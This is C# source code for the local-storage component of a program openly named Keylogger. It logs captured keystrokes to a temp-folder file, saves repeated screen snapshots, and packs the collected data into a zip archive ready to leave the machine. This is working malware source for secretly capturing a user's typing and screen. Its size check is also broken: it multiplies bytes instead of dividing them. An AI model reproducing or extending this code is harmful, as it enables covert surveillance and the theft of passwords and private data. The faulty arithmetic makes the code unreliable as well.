using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;

namespace Keylogger
{
    public class LocalStorage
    {
        private int MaxSizeMB;
        private string BaseDirectory;
        private string KeysFile;
        private string BasicImageFile;



        public LocalStorage(int maxSizeMB)
        {
            MaxSizeMB = maxSizeMB;
            BaseDirectory = Path.Combine(Path.GetTempPath(), "KeyloggerTemp");
            KeysFile = Path.Combine(BaseDirectory, "Keys.log");
            BasicImageFile = Path.Combine(BaseDirectory, "ScreenSnapshot.png");

            Directory.CreateDirectory(BaseDirectory);
        }




        public void SaveKeys(IEnumerable<Key> keys)
        {
            File.AppendAllLines(KeysFile, keys.Select(x => x.ToString()));
        }
        public void SaveScreenSnapshot(Bitmap bitmap)
        {
            bitmap.Save(NextImageFile(), ImageFormat.Png);
        }

        public bool IsFull()
        {
            // Calculate directory size
            long sizeBytes = Directory.GetFiles(BaseDirectory, "*", SearchOption.AllDirectories).Sum(x => new FileInfo(x).Length);
            long sizeMB = sizeBytes * 1024 * 1024;

            return sizeMB > MaxSizeMB;
        }

        public string PackToZip()
        {
            // Prepare place for ZIP
            string zipFile = Path.Combine(Path.GetTempPath(), "Archive.zip");
            if (File.Exists(zipFile))
                File.Delete(zipFile);

            // Create ZIP file
            ZipFile.CreateFromDirectory(BaseDirectory, zipFile);

            return zipFile;
        }

        public void Clear()
        {
            foreach (string file in Directory.GetFiles(BaseDirectory))
                File.Delete(file);
        }



        private string NextImageFile()
        {
            int currentVersion = 1;
            string currentImageFile;

            do
                currentImageFile = BasicImageFile.AddVersion(currentVersion++);
            while (File.Exists(currentImageFile));

            return currentImageFile;
        }
    }
}
